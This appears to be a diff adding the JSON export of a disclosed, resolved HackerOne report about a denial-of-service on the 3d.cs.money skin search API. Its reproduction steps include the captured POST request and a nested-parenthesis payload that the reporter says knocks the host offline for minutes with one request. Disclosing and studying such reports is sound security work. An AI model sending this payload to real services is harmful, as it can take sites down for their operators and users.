@@ -1,0 +1,125 @@
+{
+  "id": 993582,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTM1ODI=",
+  "url": "https://hackerone.com/reports/993582",
+  "title": "Application DOS via specially crafted payload on 3d.cs.money",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-28T18:28:49.623Z",
+  "submitted_at": "2020-09-28T18:28:49.678Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "enigmaticjohn",
+    "url": "/enigmaticjohn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/FyYEq1N1itB6rgYGfmieTVnT/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 48311,
+    "url": "https://hackerone.com/cs_money",
+    "handle": "cs_money",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "CS Money",
+      "twitter_handle": "csmoneytrade",
+      "website": "https://cs.money",
+      "about": "CS2 trading platform that helps people to trade, buy, sell and search for the best skins and deals they could possibly find."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-10-01T11:46:38.782Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-01T11:31:56.500Z",
+  "team_member_agreed_on_going_public_at": "2020-10-01T11:46:38.704Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nHello Team,\nWhile testing it was observed that on **3d.cs.money** a DOS is possible via specially crafted request using only single request from single machine on search bar.\nThough I am aware of the Out of Scope policy \"Any activity that could lead to the disruption of our service (DoS)\", this scenario is different, here we are only using one Request and depending on the payload, the DOS time can be varied.\n\n## Steps To Reproduce:\n\n  1. Go to https://3d.cs.money/item/default\n  2. Turn ON the intercept and type something in search box.\n  3. A POST request will be captured as follows:\n\n```\nPOST /api/skin/search HTTP/1.1\nHost: 3d.cs.money\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 32\nOrigin: https://3d.cs.money\nConnection: close\nReferer: https://3d.cs.money/item/default\nCookie: __cfduid=d38bfad20d6ec52ba0a6af9014d27a2e81601313370; TEST_GROUP=2; UUID3D=to4nZuWnRSS4A7G; _ga=GA1.1.214308118.1601313374; _ga_HY7CCPCD7H=GS1.1.1601313373.1.1.1601316641.57; _gid=GA1.2.24460124.1601313377\n\n{\"name\":\"[Payload here]\",\"item_name\":\"AK-47\"}\n```\n  4. Send it to the Repeater.\n  5. Put the following payload at [Payload here]\n```(((((()0)))))```\n\n  6. This will take down the host for few minutes.\n  7. If we add more parenthesis like ```((((((()0))))))``` , the site will be down for more time.\n\n## Supporting Material/References:\nPFA screenshot.\n\n## Impact\n\nWeb server can be made inaccessible for any amount of time using only single request.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1006629,
+      "file_name": "host_site.jpeg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LFxHkJ5ejnMfmZnBKwNVQAa6?response-content-disposition=attachment%3B%20filename%3D%22host_site.jpeg%22%3B%20filename%2A%3DUTF-8%27%27host_site.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ23RYEIKZ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T085425Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIBf87yvrERE9sVHjEGhBeC7YR3ZoY9EhWea1Fmbm1QgIgQ6WkuP2W625aJtctd%2F1O6QW07VTZ6wS858VFr1DIA8YqugUI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHvzBJgrmcJDpbjggiqOBVuwAMLcZw6PR6nUENsVGzElSIillsP5mhgqMlsYajxi6p3j1Af0DTJ6PQEZQbY%2By5GQB%2FSdVKJ6bm9PSC3V1vJ3GNwJQM7FIE7SugrwOe%2B4gmAeClQhEy8jTc0jWeRmkST%2BQB%2FwqDiGajf%2BAZufjV7cGAz9OUvwChNOVRFPel7VnnoPQ9JV6QGcfrzZ3r7L%2Bu8rPwsv4lZkYdpxzGXnRZxlv7rV6cUmJyadedHGd5qK8x9RImqAGhSZwVP%2FxmWIMLrTs2410tuQOvFK8xHMuB%2BvTIFM4ET8vBuFpspJ1xrLvN5Mmrg72f6Qc3umMON1Pivd4DNchsT7alD7LgPa8wm0QDAYgOlkONZvJhr8O9XZRCROrJtmBFHexDSkxmnjGRGFQLeFVgqBvvNS7pQg35K6dDbm03aYcFS4uRuUUTN4uZr6k1ly63Ld0bSo8aVabC1DxNHuJalVLdTqGSQxIzeo8TEmDAQM1udqb3cI4pZ5QU9TrDkkLMSqT9anZ1Mhaf%2FDRHtuFud1v%2FZiT2oGqQ%2F0vBEpuByadqzUKBhWBGDma7XVsYEWrvXFv%2F7NHKc8z86FuqK6Y1MioxA7x8goP0ocwPY25%2FlG8QU5ndNWdFcGKFvGtroScF%2FqwyoaiHZYeN%2F1SweBHwU%2FSANon3LaL9RPls3e3dbW2M6qFqv3MB0%2BQWT0jJqeUHfu5rx6p9dYF%2BWPRDyLjHZywNLuFQOg1U1%2BkNEcySnCCGLeQy5ieqnMbNN5hhbWok14SUhAnEKuH7xLlY92tuBXxskeM5I1bUj6UFMQ2sIDV6mMReaA%2B21kbkeUgph5W7bCdi3E3pOeEPpD7Umt0hGCm9gryX7uqDwQIw2fZyFTqO0jgtfcCjC6%2B73GBjqxAahgDQgDym%2FrqCElh8PAK%2F8Q7kVKFzf27058Im31%2FPsriQrokDrx539UBgz1AF1V2ehw%2BDBwD6iyqx1ImQDupXBmntWfY%2B%2BP8VtqucjSLn4Xj%2B2ziaNpSjy8agYfeymNbku0RjL3%2F8oklNQp1cf8a%2F337ESrZ1MIsQLgWTqoqTsA1THaQqgYuxNc20SJoC1rI0NItsqaDpkoUsj4ZTERnNbMZfPw%2FAHegSwR2C8zq8AeCg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e9775b539dbae274ffad73d3eb005fc2c265abbb25bb4d89ca9f02c3d9f5f0a8",
+      "file_size": 57250,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 35,
+  "voters": [
+    "johnberzi",
+    "xploiterr",
+    "thaivu",
+    "benjamin-mauss",
+    "najeh_halawani",
+    "ali",
+    "kickbuttowski",
+    "pacmanx",
+    "what_web",
+    "zimmer75",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 45905,
+    "asset_type": "URL",
+    "asset_identifier": "3d.cs.money",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
